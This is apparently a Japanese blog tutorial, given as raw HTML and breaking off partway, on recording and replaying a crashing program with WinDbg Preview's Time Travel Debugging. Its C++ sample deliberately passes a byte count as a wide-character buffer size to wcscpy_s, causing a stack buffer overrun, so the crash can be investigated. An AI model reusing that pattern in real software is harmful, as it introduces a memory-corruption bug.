&lt;p&gt;&lt;a href=&quot;#ttd%E3%81%A7%E3%83%88%E3%83%A9%E3%83%96%E3%83%AB%E3%82%B7%E3%83%A5%E3%83%BC%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0%E3%82%92%E8%A1%8C%E3%81%86&quot;&gt;TTDでトラブルシューティングを行う&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%B7%E3%83%B3%E3%83%9C%E3%83%AB%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%82%92%E8%AA%AD%E3%81%BF%E8%BE%BC%E3%82%80&quot;&gt;シンボルファイルを読み込む&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%88%E3%83%AC%E3%83%BC%E3%82%B9%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%8B%E3%82%89%E4%BE%8B%E5%A4%96%E3%82%92%E7%A2%BA%E8%AA%8D%E3%81%99%E3%82%8B&quot;&gt;トレースファイルから例外を確認する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#ttd%E3%83%88%E3%83%AC%E3%83%BC%E3%82%B9%E5%86%85%E3%81%AE%E3%82%A4%E3%83%99%E3%83%B3%E3%83%88%E4%B8%80%E8%A6%A7%E3%82%92%E7%A2%BA%E8%AA%8D%E3%81%99%E3%82%8B&quot;&gt;TTDトレース内のイベント一覧を確認する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E4%BE%8B%E5%A4%96%E3%81%AE%E8%A9%B3%E7%B4%B0%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B&quot;&gt;例外の詳細を取得する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E4%BE%8B%E5%A4%96%E3%81%8C%E7%99%BA%E7%94%9F%E3%81%97%E3%81%9F%E3%82%BF%E3%82%A4%E3%83%9F%E3%83%B3%E3%82%B0%E3%81%AB%E3%82%B8%E3%83%A3%E3%83%B3%E3%83%97%E3%81%99%E3%82%8B&quot;&gt;例外が発生したタイミングにジャンプする&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#step-into-back&quot;&gt;Step Into Back!!!&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#bsp%E3%81%AE%E6%8C%87%E3%81%99%E3%82%A2%E3%83%89%E3%83%AC%E3%82%B9%E3%81%AE%E3%83%A1%E3%83%A2%E3%83%AA%E3%83%87%E3%83%BC%E3%82%BF%E3%82%92%E5%8F%82%E7%85%A7%E3%81%99%E3%82%8B&quot;&gt;BSPの指すアドレスのメモリデータを参照する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E8%A3%9C%E8%B6%B3esp%E3%81%A8ebp%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot;&gt;補足：ESPとEBPについて&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%95%8F%E9%A1%8C%E3%81%AE%E5%8E%9F%E5%9B%A0%E7%AE%87%E6%89%80%E3%82%92%E7%89%B9%E5%AE%9A%E3%81%99%E3%82%8B&quot;&gt;問題の原因箇所を特定する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#getcppcongreetingpwy%E9%96%A2%E6%95%B0%E3%81%AE%E3%83%87%E3%83%90%E3%83%83%E3%82%B0&quot;&gt;GetCppConGreetingPwy関数のデバッグ&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot;&gt;まとめ&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;time-travel-debugging-とは&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#time-travel-debugging-%E3%81%A8%E3%81%AF&quot; aria-label=&quot;time travel debugging とは permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Time Travel Debugging とは&lt;/h2&gt;
&lt;p&gt;Time Travel Debugging(TTD) 機能を使用することで、ユーザは実行中のプロセスの挙動を記録して、あとで「前後に」再生することができます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/time-travel-debugging-overview&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Time Travel Debugging - 概要 - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;TTDを利用した場合、以下の利点があります。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ライブデバッグとは異なり、問題が発生したタイミングに「巻き戻し」て解析を行うことができる&lt;/li&gt;
&lt;li&gt;TTDのトレースファイルを共有することで、問題再現時の情報の共有が容易になる&lt;/li&gt;
&lt;li&gt;クラッシュダンプと異なり、問題の原因となるコード実行時の情報を含む&lt;/li&gt;
&lt;li&gt;統合言語クエリ（LINQ）を用いてトレースに対してクエリを実行できる&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一方で、TTDの記録には大きなオーバーヘッドが必要になり、数分程度の記録でもGB単位の容量になる場合があります。&lt;/p&gt;
&lt;p&gt;TTD機能はWinDbg Previewで利用可能な機能ですが、VisualStudioでも同様に利用することが可能なようです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://devblogs.microsoft.com/visualstudio/introducing-time-travel-debugging-for-visual-studio-enterprise-2019/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Introducing Time Travel Debugging for Visual Studio Enterprise 2019 - Visual Studio Blog&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;ttdで作成されるファイル&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#ttd%E3%81%A7%E4%BD%9C%E6%88%90%E3%81%95%E3%82%8C%E3%82%8B%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB&quot; aria-label=&quot;ttdで作成されるファイル permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;TTDで作成されるファイル&lt;/h3&gt;
&lt;p&gt;トレース時には、通常以下の3つのファイルが作成されます。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;.idx ファイル：トレース情報にアクセスするためのインデックス&lt;/li&gt;
&lt;li&gt;.run ファイル：コードの実行が保存されるファイル&lt;/li&gt;
&lt;li&gt;.out ファイル：TTD実行時の情報が出力されるファイル&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;特に.idx ファイルと.run ファイルは、トレースに要する時間によって非常に大きなサイズになる場合があります。&lt;/p&gt;
&lt;h3 id=&quot;ttdでできないこと&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#ttd%E3%81%A7%E3%81%A7%E3%81%8D%E3%81%AA%E3%81%84%E3%81%93%E3%81%A8&quot; aria-label=&quot;ttdでできないこと permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;TTDでできないこと&lt;/h3&gt;
&lt;p&gt;本記事執筆時点（2021/10/17）のWinDbg Previewで行うTTDでは、以下の3点については実現していない点に注意が必要です。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;カーネルモードプロセスのトレース&lt;/li&gt;
&lt;li&gt;TTD再生時のメモリ書き込み&lt;/li&gt;
&lt;li&gt;Protected Process Light（PPL）で保護されたプロセスのトレース&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;特に、TTDトレースは読み取り専用となるため、条件分岐のタイミングにブレークポイントを設定して、レジスタを書き換えて任意のアドレスに分岐させるといった、ライブデバッグでよく行われる手法はTTDでは使用できません。&lt;/p&gt;
&lt;h2 id=&quot;チュートリアルサンプルプログラムの準備&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%81%E3%83%A5%E3%83%BC%E3%83%88%E3%83%AA%E3%82%A2%E3%83%AB%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%A0%E3%81%AE%E6%BA%96%E5%82%99&quot; aria-label=&quot;チュートリアルサンプルプログラムの準備 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;チュートリアル：サンプルプログラムの準備&lt;/h2&gt;
&lt;p&gt;それではここから、TTDの公式チュートリアルを実践していきたいと思います。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/time-travel-debugging-walkthrough&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Time Travel Debugging - サンプル アプリのチュートリアル - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;今回使用した環境は以下の通り。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;WIndows 10 Pro 20H2&lt;/li&gt;
&lt;li&gt;WInDbg Preview 1.2106.26002.0（管理者権限で起動）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;サンプルプログラムについては、VisualStudioではなくllvm-mingwでクロスコンパイルしたものを使用していきます。&lt;/p&gt;
&lt;p&gt;サンプルプログラムのソースコードと、コンパイル環境については以下の記事にまとめています。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;/windows-windbg-006-symbol&quot;&gt;llvm-mingwを使ってLinux環境でもシンボルファイル（.pdb）を作成する方法&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;今回使用したサンプルプログラムは以下のようなコードです。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;cpp&quot;&gt;&lt;pre class=&quot;language-cpp&quot;&gt;&lt;code class=&quot;language-cpp&quot;&gt;&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;array&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;cstring&gt;&lt;/span&gt; &lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;stdio.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;string.h&gt;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;GetCppConGreeting&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;wchar_t&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;buffer&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; size_t size&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;wchar_t&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; message &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; L&lt;span class=&quot;token string&quot;&gt;&quot;HELLO FROM THE WINDBG TEAM. GOOD LUCK IN ALL OF YOUR TIME TRAVEL DEBUGGING!&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token function&quot;&gt;wcscpy_s&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;buffer&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; size&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; message&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    std&lt;span class=&quot;token double-colon punctuation&quot;&gt;::&lt;/span&gt;array&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;wchar_t&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; greeting&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;GetCppConGreeting&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;greeting&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;greeting&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token function&quot;&gt;wprintf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;L&lt;span class=&quot;token string&quot;&gt;&quot;%ls\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; greeting&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;公式チュートリアルのソースコードを参考に作成した実行ファイル（ttd_sample.exe）をPowerShellから実行したところ、何らかの理由でプログラムが異常終了します。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/a67b31f412fbc8448faa3c68f717a457/0b533/image-28.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 83.75%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAARCAYAAADdRIy+AAAACXBIWXMAARlAAAEZQAGA43XUAAADQUlEQVQ4y4WUW2yTZRjH366OnUC2MWVAt7Gta8vafS3tECMsw61lhe5b23U9jIUyDsNkJgaHazw1mRAWTBYTJMELiN6YKImJN0YIN94ZQ4zRO6PRRIyJso2DFg9E8/Pp1+rqhnDxy/vm+573//3f5/Cpx5NZfP4U24JpvLvH0PqSuPvjQoKt8tzrH8UbGMUX2IenP4W2K2nQ1ZvE1Zug68kUrp1Rnth/msCJqyj73gzrtBQbto3T2J2m3j1KgydGnRZlrStGtSNBzZY4a5wpyjuiqNYQqm1wifYwytKPO5IhdOpTVPPuZ1Gb5IU1LgExCRgR4gWsy+gQbIkS4pjsKVRLCKc+zdDsZxK397ioDmK2JzDZRjB1/BdVpHS/REzOiHBLEE84w+jcF/KR0HOopkHK7PF7HHgQIihGVHMQX3Sa9Gufo7bopYKxEh4sVupQ048Tnb2aF5y+r8MyydP/YaTFENyDMzRF6MTHqE79Ple2iouWiBBeRqSAdbhwZXHo1qeIzX6CcoXFoeUegiK2qjNJU88RmnsnaOk9apDfN/VMYJHnFc5kofLi0DU4xZ7sRyiP9M9yQXN+b9HZmXiRr765xpdff8+31+b57odFYYEf528xv3iTHfHnpeV0zLYodR091Nr8UuXglFRJXym4MUQgPUMu9xs/Xb/Bwo2fub5wi0VZc7k7wF/0jWWNuHJHnMr6VkwVDaj6HU9L9w9JcpeqbHYUBAfGZ+TcH9z9Pcefd3/9l5u3b/PLnRy79r1sxD3kGKGqoZ2yGgtqVVdapmJ4RWVVc5jOgWd48+JlLrxzifPCBYPLnHrjPV45+y7WvkmjSGa7CP7j0CRJzbszpqSIyq8SpNpkdh8dWEljsEBbpHhmmJr1DsprN6Mq3QelbYbk2uKyNVpci8hsl8kHDaTfllOY+zwRVm/SqGr0oLShl6jzHWL99qdoeOwo67onqPcdodZ7mLVbD/Gw5yBr3OOs1sap0Q5QLSmqdqWpcu2n0lmgQv5IG7qTWPzSgpnXr3Bs7kMmT3/A4ZPvM5a9SCzzNvqxtwhMnqdn4hzbD5zBOzZHV+JVOmOz2CInaddn2BzK0hR8gY2BDI3+DI/0Zfgbc5BcoR3iOeEAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/a67b31f412fbc8448faa3c68f717a457/8ac56/image-28.webp 240w,
/static/a67b31f412fbc8448faa3c68f717a457/d3be9/image-28.webp 480w,
/static/a67b31f412fbc8448faa3c68f717a457/b0a15/image-28.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/a67b31f412fbc8448faa3c68f717a457/8ff5a/image-28.png 240w,
/static/a67b31f412fbc8448faa3c68f717a457/e85cb/image-28.png 480w,
/static/a67b31f412fbc8448faa3c68f717a457/0b533/image-28.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/a67b31f412fbc8448faa3c68f717a457/0b533/image-28.png&quot;
            alt=&quot;image-28.png&quot;
            title=&quot;image-28.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;この異常終了の原因をTTDを用いて特定していくのが、このチュートリアルのシナリオになります。&lt;/p&gt;
&lt;h2 id=&quot;ttd_sampleexe-をttdでトレースする&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#ttd_sampleexe-%E3%82%92ttd%E3%81%A7%E3%83%88%E3%83%AC%E3%83%BC%E3%82%B9%E3%81%99%E3%82%8B&quot; aria-label=&quot;ttd_sampleexe をttdでトレースする permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ttd_sample.exe をTTDでトレースする&lt;/h2&gt;
&lt;p&gt;まずはWindowsストアからダウンロードしたWinDbg Previewを管理者権限で起動します。&lt;/p&gt;
&lt;p&gt;次に、右上の[ファイル]から、以下の画像のように[Launch executable(advanced)]を選択します。&lt;/p&gt;
&lt;p&gt;ここから、デバッグ対象のバイナリを実行して、TTDトレースを取得することができます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/29a630fa24b406d2131da2f51a2b8d6c/0b533/image-29.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 46.25%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAARlAAAEZQAGA43XUAAABJUlEQVQoz4WSvU7DMBSFvTLyNgwVdOEReBMQbAy8AogCK++CRBGkElFbIVHi5seOf5I4LEyndtKgFtJkOLqSdfz53ntM9i5fcfzgQ6cMdBmC0iWklCiKYkt5nneq8ZH9Kw8nj3MowZCmHFpJ5JlGnCQQQvzCjTGdclDnJeR8jOH9FNOFxJP3ibdZjDnVFi7+XCp7ZOoOycULhnc+BOeYfXyBhgxc5mCMVS+WZdnbnVPjI+RsjKPRBEZGCKNoPXIGZatWqnd3TkkS290zhKGogYObCTIeI+Fp1ZnS2hqLf8HskrZ+N41SugYeXHsI6AJBQKsg3KuZ7bJJd7NuJ7953uzw9BmD23c7nqiS1RbUBmz7Rm1fqgIejnz8fBsLqU3ZGtoF3KUVxheS6t47uDkAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/29a630fa24b406d2131da2f51a2b8d6c/8ac56/image-29.webp 240w,
/static/29a630fa24b406d2131da2f51a2b8d6c/d3be9/image-29.webp 480w,
/static/29a630fa24b406d2131da2f51a2b8d6c/b0a15/image-29.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/29a630fa24b406d2131da2f51a2b8d6c/8ff5a/image-29.png 240w,
/static/29a630fa24b406d2131da2f51a2b8d6c/e85cb/image-29.png 480w,
/static/29a630fa24b406d2131da2f51a2b8d6c/0b533/image-29.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/29a630fa24b406d2131da2f51a2b8d6c/0b533/image-29.png&quot;
            alt=&quot;image-29.png&quot;
            title=&quot;image-29.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;今回は、[Executable]の欄に、先ほどコンパイルした&lt;code class=&quot;language-text&quot;&gt;ttd_sample.exe&lt;/code&gt;の絶対パスを入力しています。&lt;/p&gt;
&lt;p&gt;また、右下の[Record with Time Travel Debugging]のチェックを有効化します。&lt;/p&gt;
&lt;p&gt;あとの項目については、今回はデフォルトのままで問題ないので[Record]ボタンをクリックします。&lt;/p&gt;
&lt;p&gt;[Configure location]ウィンドウでは、トレースファイルの保存先を設定できます。
任意のフォルダを選択して[Record]ボタンをクリックしてください。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 527px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/19c7d77f0173fa84d4f0a31389cda00b/44385/image-30.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
